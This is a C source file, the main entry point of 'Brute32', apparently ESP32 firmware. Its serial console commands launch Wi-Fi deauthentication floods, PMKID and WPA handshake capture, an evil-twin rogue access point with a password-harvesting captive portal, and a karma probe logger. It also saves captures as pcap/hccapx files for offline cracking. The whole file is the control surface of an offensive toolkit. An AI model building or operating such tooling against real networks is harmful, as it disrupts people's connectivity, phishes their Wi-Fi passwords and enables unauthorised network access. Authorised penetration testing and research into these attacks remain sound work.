/**
 * @file main.c
 * @brief Brute32 entry point.
 *
 * Brings up Wi-Fi (management AP + STA), mounts flash storage, and starts an
 * esp_console REPL over UART as the control surface for Phase 1 — scanning,
 * deauth, PMKID capture, and handshake capture — until the web UI (Phase 1
 * follow-up) replaces it.
 */
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "esp_log.h"
#include "esp_err.h"
#include "esp_event.h"
#include "esp_console.h"
#include "nvs_flash.h"
#include "linenoise/linenoise.h"
#include "argtable3/argtable3.h"

#include "wifi_controller.h"
#include "attack_deauth.h"
#include "attack_pmkid.h"
#include "attack_handshake.h"
#include "attack_evil_twin.h"
#include "webserver.h"
#include "pcap_serializer.h"
#include "hccapx_serializer.h"
#include "storage.h"

static const char *TAG = "main";

static bool parse_mac(const char *str, uint8_t mac[6]) {
    int values[6];
    if (sscanf(str, "%x:%x:%x:%x:%x:%x", &values[0], &values[1], &values[2], &values[3], &values[4], &values[5]) != 6) {
        return false;
    }
    for (int i = 0; i < 6; i++) {
        mac[i] = (uint8_t) values[i];
    }
    return true;
}

static const wifi_ap_record_t *require_ap(int index) {
    const wifi_ap_record_t *ap = wifictl_get_ap_record((unsigned) index);
    if (ap == NULL) {
        printf("No AP at index %d. Run 'scan' first.\n", index);
    }
    return ap;
}

// --- scan ---

static int cmd_scan(int argc, char **argv) {
    wifictl_scan_nearby_aps();
    const wifictl_ap_records_t *records = wifictl_get_ap_records();
    for (unsigned i = 0; i < records->count; i++) {
        const wifi_ap_record_t *ap = &records->records[i];
        printf("[%2u] %02x:%02x:%02x:%02x:%02x:%02x  ch=%2u  rssi=%4d  %s\n",
               i, ap->bssid[0], ap->bssid[1], ap->bssid[2], ap->bssid[3], ap->bssid[4], ap->bssid[5],
               ap->primary, ap->rssi, ap->ssid);
    }
    printf("%u AP(s) found.\n", records->count);
    return 0;
}

// --- deauth ---

static struct {
    struct arg_int *ap_index;
    struct arg_str *sta_mac;
    struct arg_int *period_sec;
    struct arg_end *end;
} deauth_args;

static int cmd_deauth(int argc, char **argv) {
    int nerrors = arg_parse(argc, argv, (void **) &deauth_args);
    if (nerrors != 0) {
        arg_print_errors(stdout, deauth_args.end, argv[0]);
        return 1;
    }

    const wifi_ap_record_t *ap = require_ap(deauth_args.ap_index->ival[0]);
    if (ap == NULL) {
        return 1;
    }

    uint8_t sta_mac[6];
    bool has_sta = deauth_args.sta_mac->count > 0;
    if (has_sta && !parse_mac(deauth_args.sta_mac->sval[0], sta_mac)) {
        printf("Invalid MAC address: %s\n", deauth_args.sta_mac->sval[0]);
        return 1;
    }

    unsigned period = deauth_args.period_sec->count > 0 ? (unsigned) deauth_args.period_sec->ival[0] : 1;
    attack_deauth_start(ap, has_sta ? sta_mac : NULL, period);
    printf("Deauth started against %s (%s), every %us.\n", ap->ssid, has_sta ? "targeted" : "broadcast", period);
    return 0;
}

static int cmd_deauth_stop(int argc, char **argv) {
    attack_deauth_stop();
    printf("Deauth stopped.\n");
    return 0;
}

// --- pmkid ---

static struct {
    struct arg_int *ap_index;
    struct arg_end *end;
} pmkid_args;

static int cmd_pmkid(int argc, char **argv) {
    int nerrors = arg_parse(argc, argv, (void **) &pmkid_args);
    if (nerrors != 0) {
        arg_print_errors(stdout, pmkid_args.end, argv[0]);
        return 1;
    }
    const wifi_ap_record_t *ap = require_ap(pmkid_args.ap_index->ival[0]);
    if (ap == NULL) {
        return 1;
    }
    attack_pmkid_start(ap);
    printf("PMKID capture started against %s.\n", ap->ssid);
    return 0;
}

static int cmd_pmkid_stop(int argc, char **argv) {
    attack_pmkid_stop();
    printf("PMKID capture stopped.\n");
    return 0;
}

// --- handshake ---

static struct {
    struct arg_int *ap_index;
    struct arg_end *end;
} handshake_args;

static int cmd_handshake(int argc, char **argv) {
    int nerrors = arg_parse(argc, argv, (void **) &handshake_args);
    if (nerrors != 0) {
        arg_print_errors(stdout, handshake_args.end, argv[0]);
        return 1;
    }
    const wifi_ap_record_t *ap = require_ap(handshake_args.ap_index->ival[0]);
    if (ap == NULL) {
        return 1;
    }
    attack_handshake_start(ap);
    printf("Handshake capture started against %s. Combine with 'deauth' to force a reconnect.\n", ap->ssid);
    return 0;
}

static int cmd_handshake_stop(int argc, char **argv) {
    attack_handshake_stop();
    printf("Handshake capture stopped.\n");
    return 0;
}

// --- eviltwin ---

static struct {
    struct arg_int *ap_index;
    struct arg_end *end;
} eviltwin_args;

static int cmd_eviltwin(int argc, char **argv) {
    int nerrors = arg_parse(argc, argv, (void **) &eviltwin_args);
    if (nerrors != 0) {
        arg_print_errors(stdout, eviltwin_args.end, argv[0]);
        return 1;
    }
    const wifi_ap_record_t *ap = require_ap(eviltwin_args.ap_index->ival[0]);
    if (ap == NULL) {
        return 1;
    }
    attack_evil_twin_start(ap);
    webserver_start(ap);
    printf("Evil twin + captive portal started, cloning '%s' (open auth). Management AP is offline until 'eviltwin_stop'.\n", ap->ssid);
    return 0;
}

static int cmd_eviltwin_stop(int argc, char **argv) {
    webserver_stop();
    attack_evil_twin_stop();
    wifictl_mgmt_ap_start();
    printf("Evil twin stopped, management AP restored.\n");
    return 0;
}

static int cmd_karma_log(int argc, char **argv) {
    karma_probe_t entries[16];
    unsigned n = attack_evil_twin_get_probe_log(entries, 16);
    for (unsigned i = 0; i < n; i++) {
        karma_probe_t *e = &entries[i];
        printf("%02x:%02x:%02x:%02x:%02x:%02x  probed for \"%.*s\"\n",
               e->sta_mac[0], e->sta_mac[1], e->sta_mac[2], e->sta_mac[3], e->sta_mac[4], e->sta_mac[5],
               e->ssid_len, e->ssid);
    }
    printf("%u probe request(s) logged.\n", n);
    return 0;
}

static int cmd_creds(int argc, char **argv) {
    const char *password = webserver_get_captured_password();
    if (password != NULL) {
        printf("Captured password: %s\n", password);
    } else {
        printf("No password captured yet.\n");
    }
    return 0;
}

// --- status / save ---

static int cmd_status(int argc, char **argv) {
    const attack_pmkid_result_t *pmkid_result = attack_pmkid_get_result();
    if (pmkid_result != NULL) {
        printf("PMKID captured for SSID=%.*s AP=%02x:%02x:%02x:%02x:%02x:%02x PMKID=",
               pmkid_result->ssid_len, pmkid_result->ssid,
               pmkid_result->ap_mac[0], pmkid_result->ap_mac[1], pmkid_result->ap_mac[2],
               pmkid_result->ap_mac[3], pmkid_result->ap_mac[4], pmkid_result->ap_mac[5]);
        for (int i = 0; i < 16; i++) {
            printf("%02x", pmkid_result->pmkid[i]);
        }
        printf("\n");
    } else {
        printf("No PMKID captured yet.\n");
    }

    printf("Handshake: %s (pcap buffer: %u bytes)\n",
           attack_handshake_is_complete() ? "complete" : "incomplete",
           pcap_serializer_get_size());
    return 0;
}

static struct {
    struct arg_str *name;
    struct arg_end *end;
} save_args;

static int cmd_save(int argc, char **argv) {
    int nerrors = arg_parse(argc, argv, (void **) &save_args);
    if (nerrors != 0) {
        arg_print_errors(stdout, save_args.end, argv[0]);
        return 1;
    }
    const char *base_name = save_args.name->sval[0];

    bool saved_any = false;
    unsigned pcap_size = pcap_serializer_get_size();
    if (pcap_size > 0) {
        char pcap_name[40];
        snprintf(pcap_name, sizeof(pcap_name), "%s.pcap", base_name);
        if (storage_save_file(pcap_name, pcap_serializer_get_buffer(), pcap_size) == 0) {
            saved_any = true;
        }
    }

    hccapx_t *hccapx = hccapx_serializer_get();
    if (hccapx != NULL) {
        char hccapx_name[40];
        snprintf(hccapx_name, sizeof(hccapx_name), "%s.hccapx", base_name);
        if (storage_save_file(hccapx_name, (const uint8_t *) hccapx, sizeof(*hccapx)) == 0) {
            saved_any = true;
        }
    }

    if (!saved_any) {
        printf("Nothing to save yet.\n");
        return 1;
    }
    return 0;
}

static int cmd_fs_list(int argc, char **argv) {
    int count = storage_list_files();
    if (count >= 0) {
        printf("%d file(s).\n", count);
    }
    return 0;
}

static void register_commands() {
    esp_console_register_help_command();

    const esp_console_cmd_t scan_cmd = {
        .command = "scan",
        .help = "Scan for nearby APs",
        .func = &cmd_scan,
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&scan_cmd));

    deauth_args.ap_index = arg_int1(NULL, NULL, "<index>", "AP index from 'scan'");
    deauth_args.sta_mac = arg_str0(NULL, NULL, "<mac>", "target client MAC (default: broadcast)");
    deauth_args.period_sec = arg_int0(NULL, NULL, "<sec>", "resend period in seconds (default: 1)");
    deauth_args.end = arg_end(3);
    const esp_console_cmd_t deauth_cmd = {
        .command = "deauth",
        .help = "Start deauth attack against an AP",
        .func = &cmd_deauth,
        .argtable = &deauth_args,
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&deauth_cmd));

    const esp_console_cmd_t deauth_stop_cmd = {
        .command = "deauth_stop",
        .help = "Stop deauth attack",
        .func = &cmd_deauth_stop,
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&deauth_stop_cmd));

    pmkid_args.ap_index = arg_int1(NULL, NULL, "<index>", "AP index from 'scan'");
    pmkid_args.end = arg_end(1);
    const esp_console_cmd_t pmkid_cmd = {
        .command = "pmkid",
        .help = "Start PMKID capture against an AP",
        .func = &cmd_pmkid,
        .argtable = &pmkid_args,
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&pmkid_cmd));

    const esp_console_cmd_t pmkid_stop_cmd = {
        .command = "pmkid_stop",
        .help = "Stop PMKID capture",
        .func = &cmd_pmkid_stop,
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&pmkid_stop_cmd));

    handshake_args.ap_index = arg_int1(NULL, NULL, "<index>", "AP index from 'scan'");
    handshake_args.end = arg_end(1);
    const esp_console_cmd_t handshake_cmd = {
        .command = "handshake",
        .help = "Start handshake capture against an AP",
        .func = &cmd_handshake,
        .argtable = &handshake_args,
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&handshake_cmd));

    const esp_console_cmd_t handshake_stop_cmd = {
        .command = "handshake_stop",
        .help = "Stop handshake capture",
        .func = &cmd_handshake_stop,
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&handshake_stop_cmd));

    eviltwin_args.ap_index = arg_int1(NULL, NULL, "<index>", "AP index from 'scan'");
    eviltwin_args.end = arg_end(1);
    const esp_console_cmd_t eviltwin_cmd = {
        .command = "eviltwin",
        .help = "Start rogue AP clone + captive portal against an AP",
        .func = &cmd_eviltwin,
        .argtable = &eviltwin_args,
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&eviltwin_cmd));

    const esp_console_cmd_t eviltwin_stop_cmd = {
        .command = "eviltwin_stop",
        .help = "Stop evil twin attack and restore the management AP",
        .func = &cmd_eviltwin_stop,
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&eviltwin_stop_cmd));

    const esp_console_cmd_t karma_log_cmd = {
        .command = "karma_log",
        .help = "List probe requests seen by the karma responder",
        .func = &cmd_karma_log,
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&karma_log_cmd));

    const esp_console_cmd_t creds_cmd = {
        .command = "creds",
        .help = "Show the last password captured by the captive portal",
        .func = &cmd_creds,
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&creds_cmd));

    const esp_console_cmd_t status_cmd = {
        .command = "status",
        .help = "Show capture status (PMKID/handshake)",
        .func = &cmd_status,
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&status_cmd));

    save_args.name = arg_str1(NULL, NULL, "<name>", "base file name (no extension)");
    save_args.end = arg_end(1);
    const esp_console_cmd_t save_cmd = {
        .command = "save",
        .help = "Save captured PCAP/HCCAPX to flash as <name>.pcap/<name>.hccapx",
        .func = &cmd_save,
        .argtable = &save_args,
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&save_cmd));

    const esp_console_cmd_t fs_list_cmd = {
        .command = "fs_list",
        .help = "List saved capture files",
        .func = &cmd_fs_list,
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&fs_list_cmd));
}

void app_main(void) {
    ESP_LOGI(TAG, "Brute32 starting...");

    esp_err_t nvs_err = nvs_flash_init();
    if (nvs_err == ESP_ERR_NVS_NO_FREE_PAGES || nvs_err == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        // NVS partition truncated or its format changed; wipe and retry.
        ESP_ERROR_CHECK(nvs_flash_erase());
        nvs_err = nvs_flash_init();
    }
    ESP_ERROR_CHECK(nvs_err);

    ESP_ERROR_CHECK(esp_event_loop_create_default());
    wifictl_init();
    wifictl_mgmt_ap_start();

    if (storage_init() != 0) {
        ESP_LOGW(TAG, "Storage unavailable; 'save' will fail.");
    }

    esp_console_repl_t *repl = NULL;
    esp_console_repl_config_t repl_config = ESP_CONSOLE_REPL_CONFIG_DEFAULT();
    repl_config.prompt = "brute32>";

    esp_console_dev_uart_config_t uart_config = ESP_CONSOLE_DEV_UART_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_console_new_repl_uart(&uart_config, &repl_config, &repl));

    register_commands();

    ESP_ERROR_CHECK(esp_console_start_repl(repl));
}
